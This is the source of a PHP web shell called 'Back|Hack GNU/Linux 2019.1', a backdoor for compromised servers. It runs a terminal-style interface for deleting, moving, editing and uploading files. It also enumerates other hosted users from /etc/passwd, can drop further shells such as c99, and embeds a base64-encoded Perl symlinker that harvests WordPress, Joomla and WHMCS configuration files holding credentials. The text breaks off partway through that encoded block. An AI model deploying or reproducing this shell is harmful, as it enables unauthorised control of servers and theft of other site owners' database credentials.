<?php
#################################
# << Back|Hack GNU/Linux 2019.1 # Note : Not using system() function. Work in all server. 
#     Command Based WebShell    # Coded by Cy#b3r00T - Sora Cyber Team
################################# Recode? YOUR MOM GAY.
//Edit user & password at line 257 
error_reporting(0);
session_start();
$SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
?>
<title><< Back|Hack GNU/Linux 2019.1</title>
<body bgcolor='black'><font color='white'>
<style>
input[type=file] {
  color:lime;
}
input{
color:lime;
background-color:black;
border:0px;
}
a:hover{
color:red;
text-decoration: none;
}
a{
color:blue;
text-decoration: none;
}
</style><pre>
<?php
function usergroup() {
	if(!function_exists('posix_getegid')) {
		$user['name'] 	= @get_current_user();
		$user['uid']  	= @getmyuid();
		$user['gid']  	= @getmygid();
		$user['group']	= "?";
	} else {
		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
		$user['gid'] 	= @posix_getgrgid(posix_getegid());
		$user['name'] 	= $user['uid']['name'];
		$user['uid'] 	= $user['uid']['uid'];
		$user['group'] 	= $user['gid']['name'];
		$user['gid'] 	= $user['gid']['gid'];
	}
	return (object) $user;
}
function pindah($tempat){
echo "<script>window.location='$tempat';</script>";
}
function dashboard(){
$group=usergroup()->group;
$uid=usergroup()->uid;
$gid=usergroup()->gid;
$ip=$GLOBALS['SERVERIP'];
$user=usergroup()->name;
if($uid == "0"){
$bash="#";
}else{
$bash="$";
}
$dir=$_GET['dir'];
if(!$dir){
$dir="~";
}
echo "<form action='' method='POST'><font color='red'><b>┌─[</font><font color='#ff2b55'>$user</font><font color='yellow'>@</font><font color='#5393f4'>$ip</font><font color='red'>]–[</font><font color='#5a9124'>$dir</font><font color='red'>]
└──-</b> <font color='yellow'>$bash</font> <input type='hidden' name='dir' value='$dir'><input type='text' name='cmd' autofocus><input type='submit' name='exec' value=''></form><font color='lime'>
";
if(isset($_POST['exec'])){
$dir=$_POST['dir'];
$cmd=$_POST['cmd'];
if(preg_match('/cd/',$cmd)){
$x=explode(' ',$cmd);
if($x[1] == "/" or $x[1] == "~" or preg_match('|/|',$cmd)){
pindah("?dir=".$x[1]."");
}else{
if(is_dir("$dir/$x[1]")){
pindah("?dir=".$dir."/".$x[1]."");}else{echo "bash: cd: ".htmlspecialchars($x[1]).": No such file or directory";}}
}
elseif($cmd == "ls"){
if($dir=="~"){$dir=getcwd();}
$s=scandir($dir);
foreach($s as $ss){if($ss == "." | $ss == ".."){continue;}
if(is_dir("$dir/$ss")){
echo "<b><font color='#5393f4'>$ss</font></b>\n";
}
elseif(substr(sprintf('%o', fileperms("$ss")), -4)=="0777"){
echo "<b><font color='#88f422'>$ss</font></b>\n";
}elseif(preg_match("/.zip/",$ss) or preg_match("/.rar/",$ss) or preg_match("/.tar/",$ss) or preg_match("/.gz/",$ss)){
echo "<b><font color='red'>$ss</font></b>\n";
}elseif(preg_match("/.jpg/",$ss) or preg_match("/.gif/",$ss) or preg_match("/.png/",$ss) or preg_match("/.mp4/",$ss) or preg_match("/.mp3/",$ss) or preg_match("/.jpeg/",$ss)){
echo "<b><font color='#b92fef'>$ss</font></b>\n";
}elseif(is_link("$dir/$ss")){
echo "<b><font color='#00ffd8'>$ss</font></b>\n";
}else{
echo "$ss\n";
}
}
}
elseif($cmd == "l"){
if($dir=="~"){$dir=getcwd();}
$s=scandir($dir);
foreach($s as $ss){if($ss == "." | $ss == ".."){continue;}
if(is_dir("$dir/$ss")){
echo "<b><font color='#5393f4'>$ss/</font></b>\n";
}
elseif(substr(sprintf('%o', fileperms("$ss")), -4)=="0777"){
echo "<b><font color='#88f422'>$ss</font></b>\n";
}elseif(preg_match("/.zip/",$ss) or preg_match("/.rar/",$ss) or preg_match("/.tar/",$ss) or preg_match("/.gz/",$ss)){
echo "<b><font color='red'>$ss</font></b>\n";
}elseif(preg_match("/.jpg/",$ss) or preg_match("/.gif/",$ss) or preg_match("/.png/",$ss) or preg_match("/.mp4/",$ss) or preg_match("/.mp3/",$ss) or preg_match("/.jpeg/",$ss)){
echo "<b><font color='#b92fef'>$ss</font></b>\n";
}elseif(is_link("$dir/$ss")){
echo "<b><font color='#00ffd8'>$ss</font></b>\n";
}else{
echo "$ss\n";
}
}
}
elseif(preg_match("/rm/",$cmd)){
if($dir=="~"){$dir=getcwd();}
chdir($dir);
$x=explode(' ',$cmd);
if(@unlink($x[1])){echo "deleted.";}else{echo "permission denied.";}
}elseif(preg_match("/nano/",$cmd)){
$x=explode(' ',$cmd);
pindah("?dir=$dir&save=$x[1]");
}elseif(preg_match('/cat/',$cmd)){
chdir($dir);
$x=explode(' ',$cmd);
$content=htmlspecialchars(file_get_contents($x[1]));
echo "$content\n";
}elseif(preg_match('/mv/',$cmd)){
$x=explode(' ',$cmd);
if(!$dir or $dir=="~"){$dir=getcwd();}
$old="$x[1]";
$new="$x[2]";
#echo "$old\n$new";
chdir($dir);
if(@rename($old,$new)){echo "renamed.";}else{echo "permission denied.";}
}elseif(preg_match('/uname/',$cmd)){
$x=php_uname();
echo "$x\n";
}elseif(preg_match('/rmdir/',$cmd)){
if(!$dir or $dir=="~"){$dir=getcwd();}
$x=explode(' ',$cmd);
chdir($dir);
rmdir($x[1]);
}elseif(preg_match('/cp/',$cmd)){
if(!$dir or $dir=="~"){$dir=getcwd();}
$x=explode(' ',$cmd);
$f1=$x[1];
$f2=$x[2];
chdir($dir);
if(@copy($f1,$f2)){echo "success.";}else{echo "permission denied.";}
}elseif($cmd == "upload"){
pindah("?dir=$dir&upload");
}elseif(preg_match('/spawn/',$cmd)){
$x=explode(' ',$cmd);
if(getfile($x[1])){echo "success.";}else{echo "permission denied.";}
}elseif($cmd==help){
echo "<< Back|Hack GNU/Linux 2019.1
Coded by Cy#b3r00T - Sora Cyber Team

Logout Shell      : exit
Move File         : mv [old dir] [new dir]
Rename            : mv [old name] [new name]
Copy              : cp [old dir] [new dir]
Delete File       : rm [file]
Delete Dir        : rmdir [dir]
Edit File         : nano [file]
Upload File       : upload
View File Content : cat [file] 
Get UserID        : id
Get Username      : whoami
Get Host IP       : hosts
Get DisabledFunc  : functions
Server Info       : serverinfo
Jumping Server    : jumping
Symlink Server    : symlink
Spawn File        : spawn [name]
                          -adminer -> adminer -> adminer.php
                          -indoxploit -> indoxploit shell -> idx.php
                          -noname -> noname shell -> noname.php
                          -priv8 -> mini shell -> priv8.php
                          -c99 -> c99 shell -> c99.php";
}elseif($cmd == "exit"){
session_destroy();
pindah("?");
}elseif($cmd == "pwd"){
chdir($dir);
echo getcwd();
}elseif($cmd == "id"){
echo "uid=$uid($user) gid=$gid($group)";
}elseif($cmd == "whoami"){
echo "$user";
}elseif($cmd == "hosts"){
echo "$ip";
}elseif($cmd == "functions"){
$func=@ini_get('disable_functions');
if($func == FALSE){
echo "<font color='lime'>[OK] disabled functions is not available (NONE).</font>";
}else{
echo "<font color='red'>$func</font>";
}
}elseif($cmd == "clear"){
pindah("?dir=$dir");
}elseif($cmd == "serverinfo"){
$ip2=$_SERVER['REMOTE_ADDR'];
$function=@ini_get('disable_functions');
if($function == FALSE){$function="<font color='lime'>NONE</font>";}
echo "Server IP     : $ip | Your IP : $ip2
Web Server    : ".$_SERVER['SERVER_SOFTWARE']."
System        : ".php_uname()."
User/Group    : $user($uid)/$group($gid)
PHP Version   : ".phpversion()."
Disabled Func : ".$function."";
}elseif($cmd=="jumping")
{
  function getuser() {
  	$fopen = fopen("/etc/passwd", "r") or die(color(1, 1, "Can't read /etc/passwd"));
  	while($read = fgets($fopen)) {
  		preg_match_all('/(.*?):x:/', $read, $getuser);
  		$user[] = $getuser[1][0];
  	}
  	return $user;
  }
  function getdomainname() {
  	$fopen = fopen("/etc/named.conf", "r");
  	while($read = fgets($fopen)) {
  		preg_match_all("#/var/named/(.*?).db#", $read, $getdomain);
  		$domain[] = $getdomain[1][0];
  	}
  	return $domain;
  }
  $i = 0;
  $ip=$_SERVER['SERVER_ADDR'];
  foreach(getuser() as $user) {
    $path = "/home/$user/public_html";
      $i++;
      print "<a href='?dir=$path'>$path</a>";
      if(!function_exists('posix_getpwuid')) print "<br>";
      if(!getdomainname()) print " -> Can't get domain name<br>";
      foreach(getdomainname() as $domain) {
        $userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
        $userdomain = $userdomain->name;
        if($userdomain === $user) {
          print " => <a href='http://$domain/' target='_blank'>$domain)</a><br>";
          break;
        }
      }
    }
    print ($i === 0) ? "" : "<p>Total ada $i kamar di ".$GLOBALS['SERVERIP']."</p>";
}elseif($cmd == "symlink") {
chdir($dir);
		if(!is_writable($dir)){echo "<font color='red'>can't create directory 'backhack_sym'. permission denied</font>";exit;}
		if(!is_dir("$dir/backhack_sym/")) {
			$sym['code'] = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQojICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjIA0KIw0KIwkJTmFtZSA6IFBlcmwvQ0dJIENvbmZpZyBTeW1saW5rZXIgKFdpdGggQXV0byBCeXBhc3MgU3ltbGluayA0MDQpDQojCQlWZXJzaW9uIDogMS4yDQojCQlDcmVhdGVkIDogOSBNZWkgMjAxNw0KIwkJQXV0aG9yIDogMHgxOTk5DQojCQlUaGFua3MgVG8gOiAweElEaW90ICwgSW5kb25lc2lhbiBDb2RlIFBhcnR5ICwgSmF0aW00dQ0KIwkJTW9yZSBJbmZvIDogaHR0cDovLzB4RGFyay5ibG9nc3BvdC5jb20NCiMJCVdhbnQgdG8gcmVjb2RlID8gRG9uJ3QgZm9yZ2V0IG15IG5pY2sgbmFtZSAgOikNCiMJCWh0dHA6Ly9mYWNlYm9vay5jb20vbWVsZXguMWQNCiMJCQ0KIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyANCg0KdXNlIEZpbGU6OkNvcHk7DQp1c2Ugc3RyaWN0Ow0KdXNlIHdhcm5pbmdzOw0KdXNlIE1JTUU6OkJhc2U2NDsNCmNvcHkoIi9ldGMvcGFzc3dkIiwicGFzc3dkLnR4dCIpIDsNCm1rZGlyICJiYWNraGFja19zeW0iOw0Kc3ltbGluaygiLyIsImJhY2toYWNrX3N5bS9yb290Iik7DQpteSAkZmlsZW5hbWUgPSAncGFzc3dkLnR4dCc7DQpteSAkaHRhY2Nlc3MgPSBkZWNvZGVfYmFzZTY0KCJUM0IwYVc5dWN5QkpibVJsZUdWeklFWnZiR3h2ZDFONWJVeHBibXR6RFFwRWFYSmxZM1J2Y25sSmJtUmxlQ0JwYm1SdmVIQnNiMmwwTG1oMGJRMEtRV1JrVkhsd1pTQjBaWGgwTDNCc1lXbHVJQzV3YUhBZ0RRcEJaR1JJWVc1a2JHVnlJSFJsZUhRdmNHeGhhVzRnTG5Cb2NBMEtVMkYwYVhObWVTQkJibmtOQ2tsdVpHVjRUM0IwYVc5dWN5QXJRMmhoY25ObGREMVZWRVl0T0NBclJtRnVZM2xKYm1SbGVHbHVaeUFyU1dkdWIzSmxRMkZ6WlNBclJtOXNaR1Z5YzBacGNuTjBJQ3RZU0ZSTlRDQXJTRlJOVEZSaFlteGxJQ3RUZFhCd2NtVnpjMUoxYkdWeklDdFRkWEJ3Y21WemMwUmxjMk55YVhCMGFXOXVJQ3RPWVcxbFYybGtkR2c5S2lBTkNrRmtaRWxqYjI0Z0oyUmhkR0U2YVcxaFoyVXZjRzVuTzJKaGMyVTJOQ3hwVmtKUFVuY3dTMGRuYjBGQlFVRk9VMVZvUlZWblFVRkJRa0ZCUVVGQlVVTkJXVUZCUVVGbU9DODVhRUZCUVVGQ1NFNURVMVpSU1VOQlowbG1RV2hyYVVGQlFVRkJiSGRUUm14NlFVRkJUakYzUVVGRVpHTkNVV2xwWW1WQlFVRkJRbXd3VWxab01GVXlPVzFrU0dSb1kyMVZRV1F6WkROTWJXeDFZVE5PYWxsWVFteE1iVGw1V2pWMmRWQkNiMEZCUVVaVlUxVlNRbFpFYVU1d1drczVVMmRPUWtaSldGQjJXRTV1WkdwalVtOXdXRFJWTkd0WFZuSTFRVU5vVlRkSU9FSlRaa2wwUVVoclFqbERXSE55VnpCSGQwVlJkRkozVmt0TlVuUkJWVGhhWTFsWFlVNXRUVEpQZUhGNWVXbFpXbVJqUjBsaFdqUmFOemROWldWUlkzYzJSRVpCTDFWRVZVRkJXVWhJYWpob1QwRlVhamx2VWxObE1sb3haakpMYWxBeFptZE1hMjVOVUZNMWJGY3dWbWswY0ZwdmNIWklXRVJYSzBsb1QzSTVPV2RZVkhwcmNqbHhkbFJDVFhSeVRtUTRRWE5NVm1OdmJWcExSRkEyTVd0RlRHbG9SMGxLT1ZGQ1owOHlhbVJ6U1VVdlNtSTFUMkZqUjBaQmQwUlJSV1ZOUlU5YWJtZ3hSWEZOUTJoMFUwSTRZVFkwUWxjeVRVNW9OMUZXYVdoRFIwdGpUa2h6ZDIxYU1HeEJhMWxJZUVZMFVXaENVRU5MU1ZsU1ZUbHNOakExUzIxSFEwVkpWVmw2ZEVOWlRVSm1hMFZxUjFvMFQybElkMUpSUml0MmExRkhLM0IwUVVOSlJsSkZTbFpRVVVGMlJtWXJRbkpxYjNsUkswTmFabkZ4TVRFNFJGSkdSV2hxWldKaVltVnNObVJIYVhsVWNXWXJkbE55YTJGU1VTOHdkWFJNTjIxSVdHdzVkbkVyWlZBelZXNWlhQzlJTldkRVMybFBSalkzV1dWaVdUQmtVMHBqVWtKdE1Ib3lja1pzTW5sWGNEaEJWa1JKVnpNeVpHRTNjRXhCUVVGQlFVVnNSbFJyVTNWUmJVTkRKeUJlWGtSSlVrVkRWRTlTV1Y1ZURRcEVaV1poZFd4MFNXTnZiaUFuWkdGMFlUcHBiV0ZuWlM5d2JtYzdZbUZ6WlRZMExHbFdRazlTZHpCTFIyZHZRVUZCUVU1VFZXaEZWV2RCUVVGQ1FVRkJRVUZSUTBGWlFVRkJRV1k0THpsb1FVRkJRVUZZVGxOU01FbEJjbk0wWXpaUlFVRkJRVnBwVXpCa1JVRlFPRUV2ZDBRdmIwd3libXQzUVVGQlFXeDNVMFpzZWtGQlFVeEZkMEZCUTNoTlFrRktjV05IUVVGQlFVRmtNRk5WTVVaQ09XOUtRbWhqVkVwMk1rSXlaRFJCUVVGS1RWTlZVa0pXUkdwTVlscFBPVlJvZUZwRlNWY3ZjV3gyWkhSTk16aENUbWRLVVcxUlowcEhaQ3RCTDAxUlFreDNSMnBwZDBnemJuZGthMU5NZEU4eWVFVlNSelZNY1hoWVVsTkpVakpaUkdaRU5FZHJSMDB3VUROeVlqUmlPVkJCZWpCc04zQlRiRmRzVnpCbWJtNU1iMnhCU1ZCQ05GQllhRFJsUm5WdWRXTkJTVWxNZDJSRlUyVmFlVUZwWm01d05pdDFPVzlPVEc4elowMHpUbnBVWkVoU0t5OHZlblpLVFhwVGVVcExTMjlrYVVsbk9FRllZWGhsU1hveFlrUmFOMDE0Y1U1bWRHZFRWVkpFVjNrM1RGVnVXakJrV1cxNFFVWkJWa1ZzU1RaQlJVTjVaMGx6VVZGemFYcE1RazlCUWtGRVQycExRWEJ4YURkMU4wZHZRMVZYYVhkWlltVjBiMVZJY25KUVkzZERjVzlHTWt0VlpWaE1la1Y2UW5Zd0szVlJiVk5JVFVWYU9VWTJVMXBqY2pacE5FbHpRazloTDJJM1NGRk5ZVWgwU1VGM1oweGtTR0ZzUkVFeFpYWXdaVkZpVTJweVJYSlJkMHB3Y1VZMFpVRjRMMmh2Y1VReE16SnRUV3RLY21rMWRWTlBiRVpvUldod1ZWRkphVzlxZDJGdFQwUk9jMnhxWmxWWFEzRndURzVQWVdGRFUwdEtkRzVoUWtOeldsbHFRV3hzYlZoSk5IWmhaVzloVmxnd1kySlRaR2h0VlZJemVrRkxkazVxV1RaV2FXOXZNSFJYZW1kRmIyNUxZbGNyUzJ0SFYzUXpWVzUwTUVObFIyWktjemxuSzFWVk1ISkZSMGhJTDBoM0wwMXFTRFl2VkN0UVQyUkdiMUpPUzBOb1RUSXllRzFQVUdWemNHcFFSMUUyU0hCT1VUSTNkRFp6UVVORVUwNWhibmx2YkdwRVRFVmtWbUZHVDB4bE9GcHJWV3BMTlhWcmNUTjBOemxzVUVNM0wwOUVhelZIWVN0Wk5rODFUWEY1YlU1M00xWXhlVE5vZVhwbVdEQm9jWFpLVEhsaVdFWmtLeXRtTW1RelpEQmtiWE1yY1habk5FOUVlamhtU0hnd0wweHpZbVV6T1RZMGMxTTNLelIxUldwMWJuQnhiVk5sTm1VelJETk9OUzlPTUZkYVluUnNlVGxtTURsdVdqSmFMMkl5T1hZeVpreEZaWFoyU3pseGRqZGpNblJ2UzJrNFZXbHBVV2x4U0dKdE5uSnBWelpoTVRObWJpdDZkamN6SzI5eGIzSm9ZMHhuUzFWR1dGWlFLMlp1TlRJclRHOXVhamhKVEVvd1VEaGFTVU5EUmprdlVGUndRMnhvY0VKMloxQmxiRzlNT1ZVMU5VNUpRVUZCUVVGQlUxVldUMUpMTlVOWlNVazlKdzBLU1c1a1pYaEpaMjV2Y21VZ0tpNTBlSFEwTURRTkNrbHVaR1Y0VTNSNWJHVlRhR1ZsZENBbmFIUjBjRG92TDJWMlpXNTBMbWx1Wkc5NGNHeHZhWFF1YjNJdWFXUXZjM2x0YkdsdWF5NWpjM01uRFFwU1pYZHlhWFJsUlc1bmFXNWxJRTl1RFFwU1pYZHlhWFJsUTI5dVpDQWxlMUpGVVZWRlUxUmZSa2xNUlU1QlRVVjlJRjR1S2pCNGMzbHROREEwSUZ0T1ExME5DbEpsZDNKcGRHVlNkV3hsSUZ3dWRIaDBKQ0FsZTFKRlVWVkZVMVJmVlZKSmZUUXdOQ0JiVEN4U1BUTXdNaTVPUTEwPSIpOw0KbXkgJHN5bSA9IGRlY29kZV9iYXNlNjQoIlQzQjBhVzl1Y3lCSmJtUmxlR1Z6SUVadmJHeHZkMU41YlV4cGJtdHpEUXBFYVhKbFkzUnZjbmxKYm1SbGVDQnBibVJ2ZUhCc2IybDBMbWgwYlEwS1NHVmhaR1Z5VG1GdFpTQXdlREU1T1RrdWRIaDBEUXBUWVhScGMyWjVJRUZ1ZVEwS1NXNWtaWGhQY0hScGIyNXpJRWxuYm05eVpVTmhjMlVnUm1GdVkzbEpibVJsZUdsdVp5QkdiMnhrWlhKelJtbHljM1FnVG1GdFpWZHBaSFJvUFNvZ1JHVnpZM0pwY0hScGIyNVhhV1IwYUQwcUlGTjFjSEJ5WlhOelNGUk5URkJ5WldGdFlteGxEUXBKYm1SbGVFbG5ibTl5WlNBcURRcEpibVJsZUZOMGVXeGxVMmhsWlhRZ0oyaDBkSEE2THk5bGRtVnVkQzVwYm1SdmVIQnNiMmwwTG05eUxtbGtMM041Yld4cGJtc3VZM056Snc9PSIpOw0Kb3BlbihteSAkZmgxLCAnPicsICdiYWNraGFja19zeW0vLmh0YWNjZXNzJyk7DQpwcmludCAkZmgxICIkaHRhY2Nlc3MiOw0KY2xvc2UgJGZoMTsNCm9wZW4obXkgJHh4LCAnPicsICdiYWNraGFja19zeW0vbmVtdS50eHQnKTsNCnByaW50ICR4eCAiJHN5bSI7DQpjbG9zZSAkeHg7DQpvcGVuKG15ICRmaCwgJzw6ZW5jb2RpbmcoVVRGLTgpJywgJGZpbGVuYW1lKTsNCndoaWxlIChteSAkcm93ID0gPCRmaD4pIHsNCm15IEBtYXRjaGVzID0gJHJvdyA9fiAvKC4qPyk6eDovZzsNCm15ICR1c2VybnlhID0gJDE7DQpteSBAYXJyYXkgPSAoDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nLy5hY2Nlc3NoYXNoJywgdHlwZSA9PiAnV0hNLWFjY2Vzc2hhc2gnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsIHR5cGUgPT4gJ0xva29tZWRpYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCB0eXBlID0+ICdQcmVzdGFTaG9wJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9hcHAvZXRjL2xvY2FsLnhtbCcsIHR5cGUgPT4gJ01hZ2VudG8nIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCB0eXBlID0+ICdPcGVuQ2FydCcgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwbGljYXRpb24vY29uZmlnL2RhdGFiYXNlLnBocCcsIHR5cGUgPT4gJ0VsbGlzbGFiJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93cC90ZXN0L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wb3J0YWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XUC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RlbW8vd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92MS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92Mi93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2cvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdeV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Ntcy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmV0YS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcG9ydGFsL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kZW1vL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC90ZXN0L2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92MS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjIvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE1DUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzMS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWE